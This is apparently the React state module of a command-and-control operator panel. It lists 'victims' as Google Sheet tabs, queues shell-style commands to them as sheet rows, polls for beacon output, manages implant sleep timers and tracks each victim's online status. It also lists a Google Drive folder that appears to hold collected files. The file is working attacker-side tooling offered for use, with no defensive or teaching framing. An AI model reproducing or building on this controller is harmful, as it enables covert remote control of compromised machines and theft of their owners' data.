import { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
import axios from 'axios';

const AppContext = createContext(null);

// How often to poll while waiting for beacon response (ms)
const POLL_INTERVAL_MS = 4000;
// Stop polling after this many attempts (e.g. 75 × 4s = 5 min)
const MAX_POLL_ATTEMPTS = 75;

export function AppProvider({ children }) {
  const [config, setConfig] = useState({
    sheetId: '', driveId: '', hasServiceAccount: false,
    commandService: '', fileSystemService: '',
  });
  const [configLoaded, setConfigLoaded] = useState(false);
  const [configError, setConfigError]   = useState(null);

  const [victims, setVictims]           = useState([]);
  const [activeVictim, setActiveVictim] = useState(null);
  const [rows, setRows]                 = useState([]);
  const [driveFiles, setDriveFiles]     = useState([]);
  const [loading, setLoading]           = useState(false);
  const [driveLoading, setDriveLoading] = useState(false);
  const [error, setError]               = useState(null);
  const [ticker, setTicker]             = useState(60);
  const [autoRefresh, setAutoRefresh]   = useState(false);
  const [lastRefresh, setLastRefresh]   = useState(null);
  const [showSettings, setShowSettings] = useState(false);
  const [showDrive, setShowDrive]       = useState(false);
  const [sleepStatus, setSleepStatus]   = useState({});
  const [victimStatus, setVictimStatus] = useState({});
  // ── Smart polling state ───────────────────────────────────────────────────
  // pendingRow: the rowIndex we're waiting for a beacon response on
  const [pendingRow, setPendingRow]     = useState(null);
  const [polling, setPolling]           = useState(false);
  const pollTimerRef  = useRef(null);
  const pollCountRef  = useRef(0);
  const onPollOutputRef = useRef(null);
  const sleepWakeTimersRef = useRef({});
  const activeVictimRef = useRef(activeVictim);
  const victimsRef = useRef(victims);
  useEffect(() => { activeVictimRef.current = activeVictim; }, [activeVictim]);
  useEffect(() => { victimsRef.current = victims; }, [victims]);

  // ── Load config from options.yml ──────────────────────────────────────────
  const fetchConfig = useCallback(async () => {
    try {
      const res = await axios.get('/api/config');
      setConfig(res.data);
      setConfigError(null);
      setConfigLoaded(true);
    } catch (e) {
      setConfigError(e.response?.data?.error || e.message);
      setConfigLoaded(true);
    }
  }, []);

  useEffect(() => { fetchConfig(); }, []);

  const isConfigured = configLoaded && config.hasServiceAccount && !!config.sheetId;

  const saveConfig = useCallback(async (updates) => {
    try {
      await axios.post('/api/config', updates);
      await fetchConfig();
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    }
  }, [fetchConfig]);

  // ── Core fetch rows (returns the rows array so polling can inspect it) ────
  const setVictimOnline = useCallback((victimId, online) => {
    setVictimStatus((prev) => ({
      ...prev,
      [victimId]: online ? 'online' : 'offline',
    }));
  }, []);

  const fetchRowsRaw = useCallback(async (victim) => {
    if (!victim || !isConfigured) return null;
    try {
      const res = await axios.get('/api/sheets/rows', {
        params: { sheetName: victim.title },
      });
      const fetched = res.data.rows || [];
      setRows(fetched);
      setLastRefresh(new Date());
      setVictimOnline(victim.id, true);
      setSleepStatus((prev) => {
        const sleepEntry = prev[victim.id];
        if (!sleepEntry || sleepEntry.state === 'ready') return prev;
        if (new Date(sleepEntry.wakeAt) > new Date()) return prev;
        if (sleepEntry.rowIndex) {
          const sleepRow = fetched.find((r) => r.rowIndex === sleepEntry.rowIndex);
          if (!sleepRow?.output) return prev;
        }
        return {
          ...prev,
          [victim.id]: { ...sleepEntry, state: 'ready' },
        };
      });
      return fetched;
    } catch (e) {
      setError(e.response?.data?.error || e.message);
      setSleepStatus((prev) => {
        const sleepEntry = victim?.id ? prev[victim.id] : null;
        if (!sleepEntry || sleepEntry.state === 'waiting') return prev;
        if (new Date(sleepEntry.wakeAt) > new Date()) return prev;
        return {
          ...prev,
          [victim.id]: { ...sleepEntry, state: 'waiting' },
        };
      });
      setVictimOnline(victim?.id, false);
      return null;
    }
  }, [isConfigured, setVictimOnline]);

  const fetchRowsForVictim = useCallback(async (victim) => {
    if (!victim || !isConfigured) return null;
    try {
      const res = await axios.get('/api/sheets/rows', {
        params: { sheetName: victim.title },
      });
      return res.data.rows || [];
    } catch (_) {
      return null;
    }
  }, [isConfigured]);

  const fetchRows = useCallback(async (victim = activeVictimRef.current) => {
    if (!victim || !isConfigured) return;
    setLoading(true);
    try {
      await fetchRowsRaw(victim);
      // Also refresh ticker silently
      try {
        const tr = await axios.get('/api/sheets/ticker', {
          params: { sheetName: victim.title },
        });
        setTicker(tr.data.ticker || 60);
      } catch (_) {}
    } finally {
      setLoading(false);
    }
  }, [isConfigured, fetchRowsRaw]);

  // ── Stop any in-progress poll ─────────────────────────────────────────────
  const stopPolling = useCallback(() => {
    if (pollTimerRef.current) {
      clearInterval(pollTimerRef.current);
      pollTimerRef.current = null;
    }
    pollCountRef.current = 0;
    onPollOutputRef.current = null;
    setPolling(false);
    setPendingRow(null);
  }, []);

  // ── Start smart polling after a command is sent ───────────────────────────
  // Polls every POLL_INTERVAL_MS and stops as soon as the target row has output.
  const startPolling = useCallback((targetRowIndex, { onOutput } = {}) => {
    if (pollTimerRef.current) clearInterval(pollTimerRef.current);
    pollCountRef.current = 0;
    onPollOutputRef.current = onOutput || null;
    setPendingRow(targetRowIndex);
    setPolling(true);

    pollTimerRef.current = setInterval(async () => {
      pollCountRef.current += 1;

      const victim = activeVictimRef.current;
      if (!victim) { stopPolling(); return; }

      const fetched = await fetchRowsRaw(victim);

      if (fetched) {
        const targetRow = fetched.find(r => r.rowIndex === targetRowIndex);
        if (targetRow && targetRow.output) {
          const done = onPollOutputRef.current;
          stopPolling();
          done?.();
          return;
        }
      }

      if (pollCountRef.current >= MAX_POLL_ATTEMPTS) {
        stopPolling();
      }
    }, POLL_INTERVAL_MS);
  }, [fetchRowsRaw, stopPolling]);

  const parseSleepDuration = (value) => {
    if (!value) return null;
    const trimmed = value.trim();
    const regexp = /(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/i;
    const matched = trimmed.match(regexp);
    if (!matched) return null;
    const hours = Number(matched[1] || 0);
    const minutes = Number(matched[2] || 0);
    const seconds = Number(matched[3] || 0);
    const total = hours * 3600000 + minutes * 60000 + seconds * 1000;
    return total > 0 ? total : null;
  };

  const parseHHMMSS = (value) => {
    if (!value) return null;
    const parts = value.trim().split(':');
    if (parts.length !== 3) return null;
    const h = Number(parts[0]);
    const m = Number(parts[1]);
    const s = Number(parts[2]);
    if (isNaN(h) || isNaN(m) || isNaN(s)) return null;
    if (m >= 60 || s >= 60) return null;
    const ms = h * 3600000 + m * 60000 + s * 1000;
    return ms > 0 ? ms : null;
  };

  // ── Send a command ────────────────────────────────────────────────────────
  const sendCommand = useCallback(async (command) => {
    if (!activeVictimRef.current || !isConfigured) return false;
    try {
      // Stop any existing poll for a previous command
      stopPolling();

      const cmdRows = rows.filter(r => r.command && r.command !== 'Delay configuration (sec)');
      const nextRowIndex = cmdRows.length + 1;
      const trimmed = command.trim();
      const sleepCommand = trimmed.toLowerCase().startsWith('sleep ');
      const finishCommand = trimmed.toLowerCase() === 'finish';
      let sleepMs = null;
      const activeSleep = sleepStatus?.[activeVictimRef.current.id] && new Date(sleepStatus[activeVictimRef.current.id].wakeAt) > new Date();

      if (finishCommand) {
        setError('Use direct sleep command only, e.g. sleep 00:02:00.');
        return false;
      }

      if (sleepCommand) {
        const durationString = trimmed.substring(6).trim();
        sleepMs = parseHHMMSS(durationString) || parseSleepDuration(durationString);
        if (sleepMs === null) {
          setError('Invalid sleep format. Use HH:MM:SS (e.g., 00:02:00) or examples like 10s, 5m, 1h30m.');
          return false;
        }
      }

      await axios.post('/api/sheets/command', {
        sheetName: activeVictimRef.current.title,
        command,
        rowIndex: nextRowIndex,
      });

      // Immediately refresh once so the sent command shows up
      await fetchRowsRaw(activeVictimRef.current);

      if (sleepCommand && sleepMs !== null) {
        const wakeAt = new Date(Date.now() + sleepMs);
        const victimId = activeVictimRef.current.id;
        setSleepStatus((prev) => ({
          ...prev,
          [victimId]: {
            wakeAt,
            duration: trimmed.substring(6).trim(),
            command: trimmed,
            rowIndex: nextRowIndex,
            state: 'sleeping',
          },
        }));
        setVictimOnline(victimId, true);
      } else if (!activeSleep) {
        startPolling(nextRowIndex);
      }

      return true;
    } catch (e) {
      setError(e.response?.data?.error || e.message);
      return false;
    }
  }, [isConfigured, rows, fetchRowsRaw, startPolling, stopPolling, sleepStatus, parseHHMMSS]);

  // ── Victims ───────────────────────────────────────────────────────────────
  const fetchVictims = useCallback(async () => {
    if (!isConfigured) return;
    try {
      setLoading(true); setError(null);
      const res = await axios.get('/api/sheets/tabs');
      const tabs = res.data.tabs || [];
      setVictims(tabs);
      if (!activeVictimRef.current && tabs.length > 0) {
        setActiveVictim(tabs[tabs.length - 1]);
      }
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    } finally {
      setLoading(false);
    }
  }, [isConfigured]);

  // ── Drive ─────────────────────────────────────────────────────────────────
  const fetchDriveFiles = useCallback(async () => {
    if (!isConfigured || !config.driveId) return;
    try {
      setDriveLoading(true);
      const res = await axios.get('/api/drive/files');
      setDriveFiles(res.data.files || []);
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    } finally {
      setDriveLoading(false);
    }
  }, [isConfigured, config.driveId]);

  const updateTicker = useCallback(async (value) => {
    if (!activeVictimRef.current || !isConfigured) return;
    try {
      await axios.post('/api/sheets/ticker', {
        sheetName: activeVictimRef.current.title,
        ticker: value,
      });
      setTicker(value);
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    }
  }, [isConfigured]);

  // When wakeAt elapses, update status and poll the sheet until sleep output appears
  const resolveSleepWake = useCallback(async (victimId, rowIndex) => {
    const victim = victimsRef.current.find((v) => String(v.id) === String(victimId));
    if (!victim || !isConfigured) return;

    const isActive = String(activeVictimRef.current?.id) === String(victimId);
    const rowsForVictim = isActive
      ? await fetchRowsRaw(victim)
      : await fetchRowsForVictim(victim);

    const markSleepReady = () => {
      setSleepStatus((prev) => {
        const entry = prev[victimId];
        if (!entry || entry.state === 'ready') return prev;
        return { ...prev, [victimId]: { ...entry, state: 'ready' } };
      });
      setVictimOnline(victimId, true);
    };

    if (rowsForVictim) {
      const targetRow = rowIndex
        ? rowsForVictim.find((r) => r.rowIndex === rowIndex)
        : null;
      const hasOutput = !!targetRow?.output;

      if (hasOutput) {
        markSleepReady();
      } else if (isActive && rowIndex) {
        startPolling(rowIndex, { onOutput: markSleepReady });
      } else {
        markSleepReady();
      }
    } else {
      setSleepStatus((prev) => {
        const entry = prev[victimId];
        if (!entry || entry.state === 'waiting') return prev;
        return { ...prev, [victimId]: { ...entry, state: 'waiting' } };
      });
      setVictimOnline(victimId, false);
    }
  }, [isConfigured, fetchRowsForVictim, fetchRowsRaw, setVictimOnline, startPolling]);

  // Schedule one timer per victim at wakeAt (replaces coarse 10s polling)
  useEffect(() => {
    const timers = sleepWakeTimersRef.current;

    for (const victimId of Object.keys(timers)) {
      const entry = sleepStatus[victimId];
      if (!entry || entry.state !== 'sleeping') {
        clearTimeout(timers[victimId]);
        delete timers[victimId];
      }
    }

    for (const [victimId, entry] of Object.entries(sleepStatus)) {
      if (!entry || entry.state !== 'sleeping') continue;

      const ms = new Date(entry.wakeAt).getTime() - Date.now();
      const rowIndex = entry.rowIndex;
      if (ms <= 0) {
        resolveSleepWake(victimId, rowIndex);
        continue;
      }

      if (timers[victimId]) clearTimeout(timers[victimId]);
      timers[victimId] = setTimeout(() => {
        delete timers[victimId];
        resolveSleepWake(victimId, rowIndex);
      }, ms);
    }
  }, [sleepStatus, resolveSleepWake]);

  useEffect(() => () => {
    Object.values(sleepWakeTimersRef.current).forEach(clearTimeout);
    sleepWakeTimersRef.current = {};
  }, []);

  // ── Effects ───────────────────────────────────────────────────────────────
  useEffect(() => { if (isConfigured) fetchVictims(); }, [isConfigured]);

  useEffect(() => {
    if (activeVictim) {
      stopPolling(); // stop polling when switching victims
      fetchRows(activeVictim);
    }
  }, [activeVictim?.id]);

  // Auto-refresh (manual toggle)
  useEffect(() => {
    if (!autoRefresh || !activeVictim) return;
    const id = setInterval(() => fetchRows(), ticker * 1000);
    return () => clearInterval(id);
  }, [autoRefresh, ticker, activeVictim]);

  // Drive files
  useEffect(() => {
    if (showDrive && config.driveId) fetchDriveFiles();
  }, [showDrive]);

  // Cleanup poll on unmount
  useEffect(() => () => stopPolling(), []);

  return (
    <AppContext.Provider value={{
      config, saveConfig, fetchConfig,
      configLoaded, configError,
      victims, activeVictim, setActiveVictim,
      rows, fetchRows,
      driveFiles, fetchDriveFiles,
      loading, driveLoading,
      error, setError,
      ticker, updateTicker,
      autoRefresh, setAutoRefresh,
      lastRefresh,
      sendCommand,
      fetchVictims,
      isConfigured,
      showSettings, setShowSettings,
      showDrive, setShowDrive,
      sleepStatus,
      victimStatus,
      parseHHMMSS,
      // Polling state for UI indicator
      polling, pendingRow,
    }}>
      {children}
    </AppContext.Provider>
  );
}

export const useApp = () => useContext(AppContext);
